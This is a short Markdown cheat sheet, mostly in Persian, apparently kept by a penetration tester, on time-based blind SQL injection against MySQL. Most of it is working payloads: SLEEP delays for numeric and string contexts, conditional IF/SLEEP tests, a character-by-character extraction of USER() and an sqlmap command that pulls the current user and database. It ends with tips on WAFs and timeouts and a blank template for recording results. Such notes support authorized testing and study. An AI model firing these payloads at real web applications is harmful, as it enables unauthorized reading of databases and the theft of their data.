---
tags: [web, sqli, time-based, mysql]
---

# MySQL Time-Based

## تأخیر ساده

برای Context عددی:

```sql
AND SLEEP(5)-- -
```

برای Context رشته‌ای، کوتیشن و پرانتز را متناسب با Query اصلی تنظیم کن:

```sql
' AND SLEEP(5)-- -
```

## تأخیر شرطی

```sql
AND IF(1=1,SLEEP(5),0)-- -
```

کنترل False:

```sql
AND IF(1=2,SLEEP(5),0)-- -
```

## نمونه بررسی یک کاراکتر

```sql
AND IF(
  ASCII(SUBSTRING((SELECT USER()),1,1))>100,
  SLEEP(5),
  0
)-- -
```

اگر Query چندخطی نباشد، پیلود را یک‌خطی بنویس:

```sql
AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>100,SLEEP(5),0)-- -
```

## تشخیص نسخه و کاربر با sqlmap

```bash
sqlmap -r request.txt -p id \
  --technique=T --time-sec=5 --current-user --current-db --batch
```

## نکات

- `SLEEP` ممکن است توسط WAF یا پروکسی محدود شود.
- Timeout برنامه یا وب‌سرور نباید کوتاه‌تر از تأخیر آزمون باشد.
- تأخیر روی همه ردیف‌های یک Query می‌تواند اثر بیشتری بگذارد؛ با حساب کاربری و داده آزمایشی تست کن.
- برای Context رشته‌ای، شکل کوتیشن و Comment را از رفتار برنامه استنباط کن.

## یادداشت Context من

```text
Parameter:
Working prefix:
Working suffix:
Delay observed:
Control result:
```
